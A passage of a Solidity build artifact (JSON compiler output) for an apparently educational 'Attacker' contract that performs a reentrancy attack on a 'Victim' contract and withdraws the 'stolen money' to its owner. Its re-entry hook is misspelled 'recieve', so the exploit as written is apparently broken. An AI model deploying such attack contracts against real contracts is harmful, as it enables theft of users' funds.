                  "nodeType": "YulExpressionStatement",
                  "src": "954:85:2"
                }
              ]
            },
            "name": "abi_encode_tuple_t_contract$_Victim_$157__to_t_address__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "880:9:2",
                "type": ""
              },
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "892:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "903:4:2",
                "type": ""
              }
            ],
            "src": "796:250:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1148:73:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1165:3:2"
                      },
                      {
                        "name": "length",
                        "nodeType": "YulIdentifier",
                        "src": "1170:6:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1158:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1158:19:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1158:19:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1186:29:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1205:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1210:4:2",
                        "type": "",
                        "value": "0x20"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1201:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1201:14:2"
                  },
                  "variableNames": [
                    {
                      "name": "updated_pos",
                      "nodeType": "YulIdentifier",
                      "src": "1186:11:2"
                    }
                  ]
                }
              ]
            },
            "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1120:3:2",
                "type": ""
              },
              {
                "name": "length",
                "nodeType": "YulTypedName",
                "src": "1125:6:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "updated_pos",
                "nodeType": "YulTypedName",
                "src": "1136:11:2",
                "type": ""
              }
            ],
            "src": "1052:169:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1333:58:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulIdentifier",
                            "src": "1355:6:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1363:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1351:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1351:14:2"
                      },
                      {
                        "hexValue": "4e6f7420796f7572206d6f6e6579",
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "1367:16:2",
                        "type": "",
                        "value": "Not your money"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1344:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1344:40:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1344:40:2"
                }
              ]
            },
            "name": "store_literal_in_memory_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "1325:6:2",
                "type": ""
              }
            ],
            "src": "1227:164:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1543:220:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1553:74:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1619:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1624:2:2",
                        "type": "",
                        "value": "14"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "1560:58:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1560:67:2"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "1553:3:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1725:3:2"
                      }
                    ],
                    "functionName": {
                      "name": "store_literal_in_memory_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924",
                      "nodeType": "YulIdentifier",
                      "src": "1636:88:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1636:93:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1636:93:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "1738:19:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "1749:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1754:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1745:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1745:12:2"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "1738:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "1531:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "1539:3:2",
                "type": ""
              }
            ],
            "src": "1397:366:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "1940:248:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "1950:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "1962:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1973:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "1958:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1958:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "1950:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "1997:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2008:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1993:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1993:17:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "2016:4:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2022:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "2012:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2012:20:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "1986:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "1986:47:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "1986:47:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2042:139:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "2176:4:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2050:124:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2050:131:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2042:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "1920:9:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "1935:4:2",
                "type": ""
              }
            ],
            "src": "1769:419:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2300:69:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulIdentifier",
                            "src": "2322:6:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2330:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2318:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2318:14:2"
                      },
                      {
                        "hexValue": "53656e64206d6520736f6d652045544820746f207374617274",
                        "kind": "string",
                        "nodeType": "YulLiteral",
                        "src": "2334:27:2",
                        "type": "",
                        "value": "Send me some ETH to start"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2311:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2311:51:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2311:51:2"
                }
              ]
            },
            "name": "store_literal_in_memory_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "2292:6:2",
                "type": ""
              }
            ],
            "src": "2194:175:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2521:220:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2531:74:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2597:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2602:2:2",
                        "type": "",
                        "value": "25"
                      }
                    ],
                    "functionName": {
                      "name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "2538:58:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2538:67:2"
                  },
                  "variableNames": [
                    {
                      "name": "pos",
                      "nodeType": "YulIdentifier",
                      "src": "2531:3:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2703:3:2"
                      }
                    ],
                    "functionName": {
                      "name": "store_literal_in_memory_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02",
                      "nodeType": "YulIdentifier",
                      "src": "2614:88:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2614:93:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2614:93:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2716:19:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "2727:3:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2732:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2723:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2723:12:2"
                  },
                  "variableNames": [
                    {
                      "name": "end",
                      "nodeType": "YulIdentifier",
                      "src": "2716:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02_to_t_string_memory_ptr_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "2509:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "2517:3:2",
                "type": ""
              }
            ],
            "src": "2375:366:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2918:248:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2928:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "2940:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2951:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "2936:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2936:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "2928:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2975:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "2986:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "2971:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2971:17:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "tail",
                            "nodeType": "YulIdentifier",
                            "src": "2994:4:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "3000:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "2990:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2990:20:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "2964:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2964:47:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2964:47:2"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "3020:139:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "tail",
                        "nodeType": "YulIdentifier",
                        "src": "3154:4:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02_to_t_string_memory_ptr_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "3028:124:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "3028:131:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "3020:4:2"
                    }
                  ]
                }
              ]
            },
            "name": "abi_encode_tuple_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02__to_t_string_memory_ptr__fromStack_reversed",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2898:9:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "2913:4:2",
                "type": ""
              }
            ],
            "src": "2747:419:2"
          }
        ]
      },
      "contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function identity(value) -> ret {\n        ret := value\n    }\n\n    function convert_t_uint160_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))\n    }\n\n    function convert_t_uint160_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_Victim_$157_to_t_address(value) -> converted {\n        converted := convert_t_uint160_to_t_address(value)\n    }\n\n    function abi_encode_t_contract$_Victim_$157_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_Victim_$157_to_t_address(value))\n    }\n\n    function abi_encode_tuple_t_contract$_Victim_$157__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_Victim_$157_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924(memPtr) {\n\n        mstore(add(memPtr, 0), \"Not your money\")\n\n    }\n\n    function abi_encode_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 14)\n        store_literal_in_memory_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_ead07b1a3610f914aa8590e992fe4dfbada14c041674a4d1dca0dd78f237b924_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function store_literal_in_memory_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02(memPtr) {\n\n        mstore(add(memPtr, 0), \"Send me some ETH to start\")\n\n    }\n\n    function abi_encode_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 25)\n        store_literal_in_memory_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_bc3a7752522e311bc9125683560a8eda63d28ab8edb3b329d1531bef0ba23e02_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
      "id": 2,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "sourceMap": "79:660:0:-:0;;;158:103;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;207:10;199:5;;:18;;;;;;;;;;;;;;;;;;243:10;227:6;;:27;;;;;;;;;;;;;;;;;;158:103;79:660;;88:117:2;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;79:660:0:-;;;;;;;",
  "deployedSourceMap": "79:660:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;104:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;580:157;;;;;;;;;;;;;:::i;:::-;;267:175;;;:::i;:::-;;448:126;;;:::i;:::-;;104:20;;;;;;;;;;;;:::o;580:157::-;650:5;;;;;;;;;;;636:19;;:10;:19;;;628:46;;;;;;;;;;;;:::i;:::-;;;;;;;;;692:5;;;;;;;;;;;684:23;;:46;708:21;684:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;580:157::o;267:175::-;328:7;318:9;:17;310:54;;;;;;;;;;;;:::i;:::-;;;;;;;;;374:6;;;;;;;;;;:14;;;396:7;374:32;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;417:6;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;267:175::o;448:126::-;518:7;502:6;;;;;;;;;;494:23;;;:31;491:77;;;540:6;;;;;;;;;;:15;;;:17;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;491:77;448:126::o;7::2:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:60::-;167:3;188:5;181:12;;139:60;;;:::o;205:142::-;255:9;288:53;306:34;315:24;333:5;315:24;:::i;:::-;306:34;:::i;:::-;288:53;:::i;:::-;275:66;;205:142;;;:::o;353:126::-;403:9;436:37;467:5;436:37;:::i;:::-;423:50;;353:126;;;:::o;485:140::-;549:9;582:37;613:5;582:37;:::i;:::-;569:50;;485:140;;;:::o;631:159::-;732:51;777:5;732:51;:::i;:::-;727:3;720:64;631:159;;:::o;796:250::-;903:4;941:2;930:9;926:18;918:26;;954:85;1036:1;1025:9;1021:17;1012:6;954:85;:::i;:::-;796:250;;;;:::o;1052:169::-;1136:11;1170:6;1165:3;1158:19;1210:4;1205:3;1201:14;1186:29;;1052:169;;;;:::o;1227:164::-;1367:16;1363:1;1355:6;1351:14;1344:40;1227:164;:::o;1397:366::-;1539:3;1560:67;1624:2;1619:3;1560:67;:::i;:::-;1553:74;;1636:93;1725:3;1636:93;:::i;:::-;1754:2;1749:3;1745:12;1738:19;;1397:366;;;:::o;1769:419::-;1935:4;1973:2;1962:9;1958:18;1950:26;;2022:9;2016:4;2012:20;2008:1;1997:9;1993:17;1986:47;2050:131;2176:4;2050:131;:::i;:::-;2042:139;;1769:419;;;:::o;2194:175::-;2334:27;2330:1;2322:6;2318:14;2311:51;2194:175;:::o;2375:366::-;2517:3;2538:67;2602:2;2597:3;2538:67;:::i;:::-;2531:74;;2614:93;2703:3;2614:93;:::i;:::-;2732:2;2727:3;2723:12;2716:19;;2375:366;;;:::o;2747:419::-;2913:4;2951:2;2940:9;2936:18;2928:26;;3000:9;2994:4;2990:20;2986:1;2975:9;2971:17;2964:47;3028:131;3154:4;3028:131;:::i;:::-;3020:139;;2747:419;;;:::o",
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\nimport \"./Victim.sol\";\ncontract Attacker {\n\n    Victim public victim;\n    address private owner;\n\n    constructor(address poorvictim){\n        owner = msg.sender;\n        victim = Victim(poorvictim);\n    }\n\n    function attack() public payable {\n        require(msg.value>1 ether,\"Send me some ETH to start\");\n        victim.deposit{value: 1 ether}();\n\n        victim.withdraw();\n\n    }\n\n    function recieve() public payable{\n        if(address(victim).balance>1 ether){\n            victim.withdraw();\n        }\n    }\n\n    function withdrawstolenmoney() public {\n        require(msg.sender == owner ,\"Not your money\");\n        payable(owner).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/aca/smartcontracts/reentrancy/contracts/Attacker.sol",
  "ast": {
    "absolutePath": "project:/contracts/Attacker.sol",
    "exportedSymbols": {
      "Attacker": [
        91
      ],
      "Victim": [
        157
      ]
    },
    "id": 92,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "0.8",
          ".19"
        ],
        "nodeType": "PragmaDirective",
        "src": "32:23:0"
      },
      {
        "absolutePath": "project:/contracts/Victim.sol",
        "file": "./Victim.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 92,
        "sourceUnit": 158,
        "src": "56:22:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Attacker",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 91,
        "linearizedBaseContracts": [
          91
        ],
        "name": "Attacker",
        "nameLocation": "88:8:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "930c2003",
            "id": 5,
            "mutability": "mutable",
            "name": "victim",
            "nameLocation": "118:6:0",
            "nodeType": "VariableDeclaration",
            "scope": 91,
            "src": "104:20:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Victim_$157",
              "typeString": "contract Victim"
            },
            "typeName": {
              "id": 4,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 3,
                "name": "Victim",
                "nameLocations": [
                  "104:6:0"
                ],
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 157,
                "src": "104:6:0"
              },
              "referencedDeclaration": 157,
              "src": "104:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Victim_$157",
                "typeString": "contract Victim"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 7,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "146:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 91,
            "src": "130:21:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 6,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "130:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 23,
              "nodeType": "Block",
              "src": "189:72:0",
              "statements": [
                {
                  "expression": {
                    "id": 15,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 12,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 7,
                      "src": "199:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 13,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "207:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 14,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "211:6:0",
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "207:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "199:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 16,
                  "nodeType": "ExpressionStatement",
                  "src": "199:18:0"
                },
                {
                  "expression": {
                    "id": 21,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 17,
                      "name": "victim",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 5,
                      "src": "227:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Victim_$157",
                        "typeString": "contract Victim"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 19,
                          "name": "poorvictim",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 9,
                          "src": "243:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 18,
                        "name": "Victim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 157,
                        "src": "236:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Victim_$157_$",
                          "typeString": "type(contract Victim)"
                        }
                      },
                      "id": 20,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "236:18:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Victim_$157",
                        "typeString": "contract Victim"
                      }
                    },
                    "src": "227:27:0",
                    "typeDescriptions": {
